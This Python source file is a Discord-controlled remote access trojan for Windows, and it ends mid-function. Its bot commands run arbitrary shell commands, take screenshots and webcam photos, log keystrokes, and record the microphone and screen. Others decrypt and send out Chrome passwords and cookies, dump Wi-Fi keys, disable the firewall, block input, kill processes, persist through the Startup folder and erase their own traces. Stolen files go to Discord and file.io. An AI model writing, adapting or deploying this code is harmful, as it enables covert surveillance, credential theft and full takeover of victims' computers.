import ctypes, sys, base64, logging, sqlite3, win32crypt
from Crypto.Cipher import AES
import shutil, json
from pynput.keyboard import Key, Listener
import discord, subprocess, os, psutil, datetime, pyautogui, cv2, platform, socket, win32gui, requests, threading
from discord.ext import commands
import pyperclip
from selenium import webdriver
from ctypes import *
from comtypes import CLSCTX_ALL
import urllib
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32com.shell.shell as shell
from scipy.io.wavfile import write
import sounddevice as sd
import win32com.client as win32cl
import numpy as np
import pafy, urllib.parse, vlc, time, win32con

token = "#your bots token"

client = commands.Bot(command_prefix=";")

def isadmin() -> bool:
    try:
        tryit = (os.getutd() == 0)
    except AttributeError:
        tryit = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return tryit

winmm =  windll.LoadLibrary("winmm.dll")
widn = winmm.waveInGetDevCapsA 
widn.restype = c_uint

waveNum = winmm.waveInGetNumDevs

s = create_string_buffer(b'\000' * 32)

class Micro(Structure):
     _fields_ = [
          ("wMid",c_ushort),
          ("wPid",c_ushort),
          ("vDriverVersion",c_uint),
          ("szPname", type(s)),
          ("dwFormats",c_uint),
          ("wChannels",c_ushort), 
          ("wReserved1",c_ushort),
          ]

def microcheck() -> bool:
    widn.argtypes = [
        c_uint,
        POINTER(Micro),
        c_uint
        ]
     
    structLP = Micro()
               
    if "Microphone" or "microphone" in structLP.szPname:
        return True
    else:
        return False
    
    
@client.event
async def on_message(message):
    if message.content == ";shutdown":
        subprocess.run(["shutdown.exe", "-s"])
        await message.reply(f"Shutdown {os.getlogin()}'s PC")
        
    elif message.content == ";restart":
        subprocess.run(["shutdown.exe", "-r"])
        await message.reply(f"Restarted {os.getlogin()}'s PC")
        
    elif message.content.startswith(";runcmd"):
        argx = message.content[8:]
        subprocess.run(argx, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        await message.reply(f"Ran Command Line Command {argx} On {os.getlogin()}'s PC")
        
    elif message.content.startswith(";loadweb"):
        if "http" not in message.content[9:]:
            await message.reply(f"{message.content[9:]} Is Not A Valid Website!")
        else:
            driver = webdriver.Chrome("chromedriver.exe")
            driver.get(message.content[9:])
            await message.reply(f"Visited {message.content[9:]} On {os.getlogin()}'s PC")
    
    elif message.content == ";allprocesses":
        temp = os.getenv("TEMP")
        if os.path.exists(temp + f"\\{os.getlogin()}-CurrentProcesses.txt"):
            os.remove(temp + f"\\{os.getlogin()}-CurrentProcesses.txt")
        with open(temp + f"\\{os.getlogin()}-CurrentProcesses.txt", "a")as f:
            for proc in psutil.process_iter():
                f.write(f"{str(proc)}\n")
        file = discord.File(temp + f"\\{os.getlogin()}-CurrentProcesses.txt", f"{os.getlogin()}-CurrentProcesses.txt")
        await message.reply(f"Processes Running On {os.getlogin()}'s PC:\n", file=file)
        
        with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
            e.write(str(temp + f"\\{os.getlogin()}-CurrentProcesses.txt\n"))
        
    elif message.content == ";screenshot":
        temp = os.getenv("TEMP")
        if os.path.exists(temp + f"\\{os.getlogin()}-Screenshot.png"):
            os.remove(temp + f"\\{os.getlogin()}-Screenshot.png")
        ss = pyautogui.screenshot()
        ss.save(temp + f"\\{os.getlogin()}-Screenshot.png")
        file = discord.File(temp + f"\\{os.getlogin()}-Screenshot.png", f"\\{os.getlogin()}-Screenshot.png")
        await message.reply(f"{os.getlogin()}'s Current Screen:\n", file=file)
        
        
        with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
            e.write(str(temp + f"\\{os.getlogin()}-Screenshot.png"))
            
    elif message.content == ";webcam":
        temp = os.getenv("TEMP")
        if os.path.exists(temp + f"\\{os.getlogin()}-webcam.png"):
            os.remove(temp + f"\\{os.getlogin()}-webcam.png")
        with open(temp + f"\\{os.getlogin()}-webcam.png", "a")as d:
            pass
        cp = 0
        camera = cv2.VideoCapture(cp)
        returned_value, image = camera.read()
        cv2.imwrite(temp + f"\\{os.getlogin()}-webcam.png", image)
        del(camera)
        
        webcampic = discord.File(temp + f"\\{os.getlogin()}-webcam.png", f"{os.getlogin()}-webcam.png")
        await message.reply(f"Picture Taken From {os.getlogin()}'s Camera:\n", file=webcampic)
        
        with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
            e.write(str(temp + f"\\{os.getlogin()}-webcam.png\n"))
        
    elif message.content == ";clipboard":
        await message.reply(f"{os.getlogin()}'s Current Clipboard:\n{pyperclip.paste()}")
        
    elif message.content == ";pcinfodump":
        PcName = socket.gethostname()
        systemx = str(platform.uname()).split("=")[1].split(",")[0]
        versiont = str(platform.uname()).split(",")[3].split("=")[1]
        machid = str(platform.uname()).split(",")[4].split("=")[1]
        procesor = str(platform.uname()).split(",")[5].split("=")[1].replace("'", "")
        await message.reply(f"PCName: {PcName}\nSystem: {systemx}\nSystem Version: {versiont}\nMachine: {machid}\nProcessor: {procesor}")
        
        
    elif message.content == ";currentwindow":
        await message.reply(f"{os.getlogin()}'s Current Window Is:\n{win32gui.GetWindowText(win32gui.GetForegroundWindow())}")
        
    elif message.content == ";ipinfodump":
        data = requests.get("http://ipinfo.io/json").json()
        try:
            PcName = socket.gethostname()
            IPV = socket.gethostbyaddr(PcName)[2]
            IPV6 = str(IPV).replace("[", "").replace("]", "")
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            postcode = data['postal']
            wifihost = data['hostname']
            wifiorg = data['org']
            lxl = data['loc']
            longitude = str(lxl).split(",")[0]
            latitude = str(lxl).split(",")[1]
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
            await message.reply(f"{os.getlogin()}'s IP Info:\nIPV4: {ip}\nIPV6: {IPV6}\nRegion: {region}\nCity: {city}\nCountry: {country}\nPostcode: {postcode}\nWifi Org: {wifihost}\nWifi Host: {wifiorg}\nLongitude And Latitude: {str(lxl)}\nLongitude: {longitude}\nLatitude: {latitude}\nGoogle Maps Link: {googlemap}")
        except:
            pass
        
    elif message.content == ";opengooglemaps":
        dx = requests.get("http://ipinfo.io/json").json()
        driver = webdriver.Chrome("chromedriver.exe")
        driver.get(f"https://www.google.com/maps/search/google+map++{dx['loc']}")
        await message.reply(f"OpenedGoogle Maps At Location {dx['loc']} On {os.getlogin()}'s PC")
        
        
    elif message.content == ";killallprocesses":
        i = 0
        for process in psutil.process_iter():
            try:    
                process.kill()
                i += 1
            except:
                pass
        await message.reply(f"Killed {i} Processes On {os.getlogin()}'s PC")
        
    elif message.content.startswith(";upload"):
        temp = os.getenv("TEMP")
        yy = 0
        for x in str(message.content[8:]):
            if x == "/":
                yy += 1
        if os.path.exists(temp + f"\\{str(message.content[8:]).split('/')[yy]}"):
            os.remove(temp + f"\\{str(message.content[8:]).split('/')[yy]}")
        pathx = temp + f"\\{str(message.content[8:]).split('/')[yy]}"
        await message.attachments[0].save(pathx)
        with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
            e.write(str(f"{temp}\\{str(message.content[8:]).split('/')[yy]}\n"))
        await message.reply(f"Saved {str(message.content[8:]).split('/')[yy]} To {temp}\{str(message.content[8:]).split('/')[yy]}")
        
    elif message.content == ";mute":
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        currentVolumeDb = volume.GetMasterVolumeLevel()
        if volume.GetMute() == 0:
            volume.SetMute(1, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
        await message.reply(f"Muted {os.getlogin()}'s Volume!")

        
    elif message.content == ";max":
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        currentVolumeDb = volume.GetMasterVolumeLevel()
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        await message.reply(f"Maximised {os.getlogin()}'s Volume!")

    elif message.content.startswith(";spamwrite"):
        content = message.content[11:]
        while 1 == 1:
            pyautogui.typewrite(str(content))
            pyautogui.press("enter")
        await message.reply(f"Succesfully Spammed {str(content)} On {os.getlogin()}'s Keyboard")
            
    elif message.content.startswith(";write"):
        content = message.content[7:]
        pyautogui.typewrite(str(content))
        pyautogui.press("enter")
        await message.reply(f"Succesfully Typed {str(content)} On {os.getlogin()}'s Keyboard")
        
    elif message.content == ";admincheck":
        if isadmin():
            await message.reply(f"Admin On {os.getlogin()}'s PC")
        elif isadmin() == False:
            await message.reply(f"Not Admin On {os.getlogin()}'s PC")
    
    elif message.content == ";getadminandclose":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        await message.reply(f"Run ;admincheck To See If The CMD Worked :)")
        sys.exit(0)
        
    elif message.content == ";getadmin":
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:] + ['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
        await message.reply(f"Run ;admincheck To See If The CMD Worked :) (Note: After Running Required Admin Commands.. If You See More Than 1 Message Ignore Them As Long As 1 Says Success It Worked.)")
        
    elif message.content == ";keylog":
        temp = os.getenv("TEMP")
        if os.path.exists(temp+f"\\{os.getlogin()}-KeyLogger.txt"):
            os.remove(temp+f"\\{os.getlogin()}-KeyLogger.txt")
        logging.basicConfig(filename=(temp+f"\\{os.getlogin()}-KeyLogger.txt"),
            level=logging.DEBUG, format='%(asctime)s: %(message)s')
        with open(temp+f"\\{os.getlogin()}-KeyLogger.txt", "a")as d:
            d.write("Started At " + str(datetime.datetime.now).split('>')[1].split(':')[0])
        with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
            e.write(str(f"{temp}\\{os.getlogin()}-KeyLogger.txt\n"))
        def kl():
            def op(key):
                logging.info(str(key))
            with Listener(on_press=op) as listener:
                listener.join()
        await message.reply(f"Started Keylogger On {os.getlogin()}'s PC")
        threading.Thread(target=kl).start()
            
    elif message.content == ";dumpkeylog":
        temp = os.getenv("TEMP")
        if os.path.exists(temp+f"\\{os.getlogin()}-KeyLogger.txt"):
            file = discord.File(temp+f"\\{os.getlogin()}-KeyLogger.txt", f"{os.getlogin()}Keylogger.txt")
            with open(temp+f"\\{os.getlogin()}-KeyLogger.txt", "r")as keylogger:
                await message.reply(f"Keylogger From {os.getlogin()} Started At {keylogger.readline().split('>')[1].split(':')[0]}", file=file)
        else:
            await message.reply(f"I Haven't Been Recording..!")
        
        
    elif message.content.startswith(";recmic"):
        temp = os.getenv("TEMP")
        if microcheck():
            if os.path.exists(f"{temp}\\{os.getlogin()}-Microphone.wav"):
                os.remove(f"{temp}\\{os.getlogin()}-Microphone.wav")
            fs = 44100
            try:
                seconds = int(str(message.content).split(" ")[1])
                myrec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                sd.wait()
                with open(f"{temp}\\{os.getlogin()}-Microphone.wav", "a")as f:
                    pass
                with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "a")as e:
                    e.write(str(f"{temp}\\{os.getlogin()}-Microphone.wav\n"))
                sizex = os.stat(f"{temp}\\{os.getlogin()}-Microphone.wav").st_size
                write(f"{temp}\\{os.getlogin()}-Microphone.wav", fs, myrec)   
                if os.stat(f"{temp}\\{os.getlogin()}-Microphone.wav").st_size > 7340032:
                    await message.reply(f"{sizex}Bytes File...Trying To Upload It To File.io...")
                    MicReq = requests.post(f"https://file.io/", files={"file": open(f"{temp}\\{os.getlogin()}-Microphone.wav", "rb")})
                    if MicReq.status_code in [200, 201, 204]:
                        link = MicReq.json()['link']
                        await message.reply(f"The {seconds}s Long Recording Of {os.getlogin()}'s Mic Was Over 8MB So Heres A Download Link {link}")     
                    else:
                        await message.reply(f"Request To Upload Over8MB File Failed...\nReturned Status Code: {MicReq.status_code}")
                else:
                    file = discord.File(f"{temp}\\{os.getlogin()}-Microphone.wav", f"{os.getlogin()}-Microphone.wav")
                    await message.reply(f"Recorded {os.getlogin()}'s Microphone For {seconds}s Heres Your Results:\n", file=file)
            except:
               await message.reply(f"Wrong Usage Of CMD ```;recmic```\nSample Usage: ```;recmic 5 (replace 5 with however many seconds you'd wish to record for..```")
        else:
            await message.reply(f"Couldn't Find A Microphone On {os.getlogin()} System")

    elif message.content == ";destroytraces":
        xx = 0 
        temp = os.getenv  ("TEMP")
        if os.path.exists(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt"):
            with open(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "r")as e:
                for line in e:
                    sl = line.strip()
                    try:
                        os.remove(sl)
                        xx += 1
                    except:
                        await message.reply(f"Couldn't Remove {sl}")
            file = discord.File(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt", "Files.txt")
            await message.reply(f"Removed {xx} Files...:\n", file=file)
            os.remove(f"{temp}\\{os.getlogin()}-WithDiscordRat.txt")

    elif message.content.startswith(";speak"):
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        currentVolumeDb = volume.GetMasterVolumeLevel()
        if volume.GetMute() == 1:
            volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        say = win32cl.Dispatch("SAPI.SpVoice")
        say.Speak(message.content[7:])
        await message.reply(f"Said {message.content[7:]} To {os.getlogin()}")
    
    elif message.content.startswith(";noinput"):
        if isadmin():
            try:
                windll.user32.BlockInput(True)
                await message.reply(f"Blocked {os.getlogin()}'s Input")
            except:
                await message.reply(f"Couldn't Block {os.getlogin()}'s Input Despite Having Priveleges...")
        else:
            await message.reply(f"This Command Won't Work Since I Do Not Have Administrative Priveleges...```;getadmin```To Try And Obtain Them")

    elif message.content.startswith(";input"):
        if isadmin():
            try:
                windll.user32.BlockInput(False)
                await message.reply(f"UnBlocked {os.getlogin()}'s Input")
            except:
                await message.reply(f"Couldn't UnBlock {os.getlogin()}'s Input Despite Having Priveleges...")
        else:
            await message.reply(f"This Command Won't Work Since I Do Not Have Administrative Priveleges...```;getadmin```To Try And Obtain Them")

    elif message.content == ";logout":
        await message.reply(f"Logged User {os.getlogin()} Out From {socket.gethostname()}")
        subprocess.run(['shutdown.exe', '-l'])
        
    elif message.content == ";idledura":
        class LII(Structure):
            _fields_ = [
                ('cbSize', c_uint),
                ('dwTime', c_int),
            ]

        def get_idle_duration() -> float:
            lii = LII()
            lii.cbSize = sizeof(lii)
            if windll.user32.GetLastInputInfo(byref(lii)):
                millis = windll.kernel32.GetTickCount() - lii.dwTime
                return millis / 1000.0
            else:
                return 0
        duration = get_idle_duration()
        await message.reply(f'{os.getlogin()} Idle For {duration}s')
        
    elif message.content == ";curdir":
        curdir = subprocess.getoutput('cd')
        await message.reply(f"{os.getlogin()}'s Current Directory Is {curdir}")
        
    elif message.content == f";dateandtime":
        await message.reply(f"Current Time In {os.getlogin()}'s Country: {subprocess.getoutput(r'echo %time%')}\nAnd The Current Date In {os.getlogin()}'s Country: {subprocess.getoutput(r'echo %date%')}")
        
    elif message.content.startswith(";changedir"):
        curdir = subprocess.getoutput('cd')
        if os.path.exists(message.content[11:]):
            os.chdir(message.content[11:])
            await message.reply(f"Changed ```{curdir}``` To ```{message.content[11:]}```")
        else:
            await message.reply(f"```{message.content[11:]}``` Isn't A Valid Directory On {os.getlogin()}'s PC")
    
    elif message.content.startswith(";screenrec"):
        temp = os.getenv("TEMP")
        if "." not in str(message.content[11:]):
            sec = int(message.content[11:])
        else:
            sec = float(message.content[11:])
        i2 = 0
        while True:
            i2 += 1
            i3 = 0.045 * i2
            if i3 >= sec:
                break
        ssx = (1920, 1080)
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        video = temp + f"\\{os.getlogin()}-ScreenRec.avi"
        output = cv2.VideoWriter(video, fourcc, 20.0, (ssx))
        keep_track = 1
        while True:
            keep_track += 1
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            output.write(frame)
            if keep_track >= i2:
                break
        output.release()
        ch = temp + f"\\{os.getlogin()}-ScreenRec.avi"
        if os.stat(ch).st_size > 7340032:
            await message.reply(f"{os.stat(ch).st_size}Bytes File...Trying To Upload It To File.io...")
            ScreenReq = requests.post(f"https://file.io/", files={"file": open(f"{temp}\\{os.getlogin()}-Microphone.wav", "rb")})
            if ScreenReq.status_code in [200, 201, 204]:
                link = ScreenReq.json()['link']
                await message.reply(f"The {sec}s Long Recording Of {os.getlogin()}'s Mic Was Over 8MB So Heres A Download Link {link}")     
            else:
                await message.reply(f"Request To Upload Over8MB Failed\nReturned Status Code: {ScreenReq.status_code}")
        else:
            file = discord.File(ch, f"{os.getlogin()}-ScreenRecording.avi")
            await message.reply(f"Recorded {os.getlogin()}'s Screen For {sec}s..Heres Your Results:\n", file=file)
    
    elif message.content == ";disablefirewall":
        if isadmin():
            try:
                subprocess.run("NetSh Advfirewall set allprofiles state off", stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                await message.reply(f"Disabled Firewall On {os.getlogin()}'s PC")
            except:
                await message.reply(f"Couldn't Disable Firewall On {os.getlogin()}'s PC...")
        else:
            await message.reply(f"This Command Won't Work Since I Do Not Have Administrative Priveleges...```;getadmin```To Try And Obtain Them")
            
    elif message.content == ";enablefirewall":
        if isadmin():
            try:
                subprocess.run("NetSh Advfirewall set allprofiles state on", stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                await message.reply(f"Enabled Firewall On {os.getlogin()}'s PC")
            except:
                await message.reply(f"Couldn't Enable Firewall On {os.getlogin()}'s PC..")
        else:
            await message.reply(f"This Command Won't Work Since I Do Not Have Administrative Priveleges...```;getadmin```To Try And Obtain Them")
    
    elif message.content.startswith(";playsound"): 
        ytlink = message.content[11:]
        video = pafy.new(ytlink)
        videolink = video.getbestaudio()
        media = vlc.MediaPlayer(videolink.url)
        media.play()
        await message.reply(f"Started Playing {ytlink} On {os.getlogin()}'s PC")
        
    elif message.content == ";chromepass":
    
        def chrometime(ch) ->str:
            return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=ch))
            
        def encryption_key():
            localsp = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
            with open(localsp, "r", encoding="utf-8") as f:
                ls = f.read()
                ls = json.loads(ls)
                
            key = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def decrypt_password(pw, key) -> str:
            try:
                iv = pw[3:15]
                password = pw[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return ""
                    
        def main():
            temp = os.getenv("TEMP")
            pwpath = f"{temp}\\{os.getlogin()}-GooglePasswords.txt"
            if os.path.exists(pwpath):
                os.remove(pwpath)
            with open(pwpath, "a")as ddd:
                key = encryption_key()
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "default", "Login Data")
                filename = f"{temp}\\ChromeData.db"
                shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                cursor = db.cursor()
                cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]        
                    if username or password:
                        ddd.write(f"Origion URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nDate Last Used: {str(chrometime(date_last_used))}\nDate Created: {str(chrometime(date_created))}\n")
                    else:
                        continue
                cursor.close()
                db.close()
                try:
                    os.remove(filename)
                except:
                    pass
                    
        main()
        
        temp = os.getenv("TEMP")
        
        file = discord.File(f"{temp}\\{os.getlogin()}-GooglePasswords.txt", f"{os.getlogin()}-GooglePass.txt")
        await message.reply(f"{os.getlogin()}'s Google Passwords:\n", file=file)
        
    elif message.content == ";chromehistory":
        temp = os.getenv("TEMP")
        dbfile = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "History")
        filename = f"{temp}\\History.db"
        shutil.copy(dbfile, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT * from urls")
        browsing_data = (cursor.fetchall())
        temp = os.getenv("TEMP")
        hispath = f"{temp}\\{os.getlogin()}-ChromeHistory.txt"
        if os.path.exists(hispath):
            os.remove(hispath)
        with open(hispath, "a")as ddd:
            for record in browsing_data:
                visit_time = str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=record[5]))
                if visit_time[:4] == "1601":
                    pass
                else:
                    visit_time = str(datetime.datetime.strptime(visit_time, "%Y-%m-%d %H:%M:%S.%f"))
                    visit_time = visit_time[:-7]
                visit_url = record[1]
                visit_line = f"{visit_time}: Website Visited: {visit_url}\n"
                ddd.write(str(visit_line))
        file = discord.File(hispath, f"{os.getlogin()}-ChromeHistory.txt")
        await message.reply(f"{os.getlogin()}'s Chrome History:\n", file=file)
        try:
            os.remove(filename)
        except:
            pass
        
    elif message.content == ";chromecookies":
            
        def get_encryption_key():
            local_state_path = os.path.join(os.environ["USERPROFILE"],
                                            "AppData", "Local", "Google", "Chrome",
                                            "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
        def decrypt_data(data, key) -> str:
            try:
                iv = data[3:15]
                data = data[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(data)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
                except:
                    return ""
                    
        def main():
            temp = os.getenv("TEMP")
            cookiespath = f"{temp}\\{os.getlogin()}-GoogleCookies.txt"
            if os.path.exists(cookiespath):
                os.remove(cookiespath)
            with open(cookiespath, "a")as cookie:
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
                filename = f"{temp}\\Cookies.db"
                if not os.path.isfile(filename):
                    shutil.copyfile(db_path, filename)
                db = sqlite3.connect(filename)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute("""
                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                FROM cookies""")
                key = get_encryption_key()
                for host_key, name, value, creation_utc, last_accesses_utc, expires_utc, encrypted_value,  in cursor.fetchall():
                    if not value:
                        decrypted_value = decrypt_data(encrypted_value, key)
                    else:
                        decrypted_value = value
                    cursor.execute("""
                    UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                    WHERE host_key = ?
                    AND name = ?""", (decrypted_value, host_key, name))
                    cookie.write(f"Host: {host_key}\nCookie name: {name}\nCookie value (decrypted): {decrypted_value}\n")
                db.commit()
                db.close()
                try:
                    os.remove(filename)
                except:
                    pass
        
        main()
        
        temp = os.getenv("TEMP")
        
        file = discord.File(f"{temp}\\{os.getlogin()}-GoogleCookies.txt", f"{os.getlogin()}-GoogleCookies.txt")
        await message.reply(f"{os.getlogin()}'s Google Cookies:\n", file=file)
        
    elif message.content == ";networkinfo":
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                data = requests.get("http://ipinfo.io/json").json()
                PcName = socket.gethostname()
                IPV = socket.gethostbyaddr(PcName)[2]
                IPV6 = str(IPV).replace("[", "").replace("]", "")
                ip = data['ip']
                await message.reply(f"{os.getlogin()}'s Connection Results:\n{i} ~ {results[0]} ~ {IPV6} ~ {ip}")
            except Exception as e:
                await message.reply(f"Exception:\n{e}")
                
    elif message.content == ";addrattostartup":
        temp = os.getenv("TEMP")
        file_path = os.path.dirname(os.path.realpath(__file__)) + f"\{__file__}"
        await message.reply(f"Path To Startup: {file_path}")
        bat_path = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(os.getlogin())
        with open(f"{temp}\\{os.getlogin()}-DiscordRat.txt", "a")as ratpath:
            ratpath.write(f"{bat_path}\\open.bat")
        if os.path.exists(f"{bat_path}\\open.bat"):
            os.remove(f"{bat_path}\\open.bat")
        with open(bat_path + '\\' + "open.bat", "a") as bat_file:
            bat_file.write(r'python "%s" echo:pause' % file_path)
        await message.reply(f"Added Rat To startup On {os.getlogin()}'s PC...")
        
    elif message.content.startswith(";upandrun"):
        temp = os.getenv("TEMP")
        name = str(message.content).split(" ")[1]
        px = f"{temp}\\{name}"
        bat = name.split(".")[0] + name.split(".")[1].replace(name.split(".")[1], ".bat")
        batpath = f"{temp}\\{bat}"
        try:
            await message.attachments[0].save(px)
            await message.reply(f"Saved {name} In Path {px}")
        except:
            await message.reply(f"Couldn't Save {name}")
        howtorun = str(message.content).split(" ")[2].strip()
        try:
            with open(f"{batpath}", "a")as batx:
                batx.write(f"{howtorun} {px}")
                await message.reply(f"Wrote {howtorun} {px} To {batpath}")
        except:
            await message.reply(f"Couldn't Write {howtorun} {px} To {batpath}")
        try:
            subprocess.call([batpath])
            await message.reply(f"Sucessfully Ran {name} On {os.getlogin()}'s PC")
        except:
            await message.reply(f"Couldn't Run {name} On {os.getlogin()}'s PC")
            
    elif message.content.startswith(";run"):
        temp = os.getenv("TEMP")
        name = str(message.content).split(" ")[1]
        bat = name.split(".")[0] + name.split(".")[1].replace(name.split(".")[1], ".bat")
        arg = str(message.content).split(" ")[2]
        if not os.path.exists(f"{bat}"):
            with open(f"{bat}", "a")as bats:
                bats.write(f"{arg} {temp}\\{name}")
        else:
            os.remove(f"{bat}")
            with open(f"{bat}", "a")as bhats:
                bhats.write(f"{arg} {temp}\\{name}")
        if not os.path.exists(f"{temp}\\{name}"):
            await message.reply(f"{temp}\\{name} Not A Valid Path Try Using ;upload!")
        else:
            subprocess.call({f"{bat}"})
            os.remove(bat)
            await message.reply(f"Ran {name} On {os.getlogin()}'s PC")
            
    elif message.content == ";downloadpython":
        pz = "chromedriver.exe"
        driver = webdriver.Chrome(pz)
        driver.get("https://www.python.org/ftp/python/3.8.9/python-3.8.9-amd64.exe")
        
    elif message.content == ";downloadnode":
        pz = "chromedriver.exe"
        driver = webdriver.Chrome(pz)
        driver.get("https://nodejs.org/dist/v16.15.0/node-v16.15.0-x64.msi")
        
    elif message.content.startswith(";addtostartupka"):
        temp = os.getenv("TEMP")
        name = str(message.content).split(" ")[1]
        arg = str(message.content).split(" ")[2]
        batname = name.split(".")[0] + name.split(".")[1].replace(name.split(".")[1], ".bat")
        batname = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(os.getlogin()) + f"\\{batname}"
        if not os.path.exists(f"{temp}\\{name}"):
            await message.attachments[0].save(f"{temp}\\{name}")
        else:
            os.remove(f"{temp}\\{name}")
            await message.attachments[0].save(f"{temp}\\{name}")
        if not os.path.exists(batname):
            with open(batname, "a")as batfilw:
                batfilw.write(f"{arg} {temp}\\{name} echo:pause")
                await message.reply(f"Added {name} To Startup.. Path: {batname}")
                
    elif message.content.startswith(";addtostartup"):
        temp = os.getenv("TEMP")
        name = str(message.content).split(" ")[1]
        arg = str(message.content).split(" ")[2]
        batname = name.split(".")[0] + name.split(".")[1].replace(name.split(".")[1], ".bat")
        batname = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'.format(os.getlogin()) + f"\\{batname}"
        if not os.path.exists(f"{temp}\\{name}"):
            await message.attachments[0].save(f"{temp}\\{name}")
        else:
            os.remove(f"{temp}\\{name}")
            await message.attachments[0].save(f"{temp}\\{name}")
        if not os.path.exists(batname):
            with open(batname, "a")as batfilw:
                batfilw.write(f"{arg} {temp}\\{name}")
                await message.reply(f"Added {name} To Startup.. Path: {batname}")
        else:
            os.remove(batname)
            with open(batname, "a")as batfilw:
                batfilw.write(f"{arg} {temp}\\{name} echo:pause")
                await message.reply(f"Added {name} To Startup. Path: {batname}")
                
    elif message.content == ";remratfromstartup":
        os.remove(r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\open.bat'.format(os.getlogin()))
        await message.reply(f"Removed Rat From {os.getlogin()}'s Startup")
        
    elif message.content == ";exit":
        await message.reply(f"Exited Rat On {os.getlogin()}'s PC")
        sys.exit(0)
        
    elif message.content == ";turnoffmonitor":
        if sys.platform.startswith("win"):
            win32gui.SendMessage(win32con.HWND_BROADCAST,
                win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
            await message.reply(f"Turned {os.getlogin()}'s Monitor Display Off")
        elif sys.platform.startswith("linux"):
            os.system("xset dpms force off")
            await message.reply(f"Turned {os.getlogin()}'s Monitor Display Off")
        elif sys.platform.startswith("darwin"):
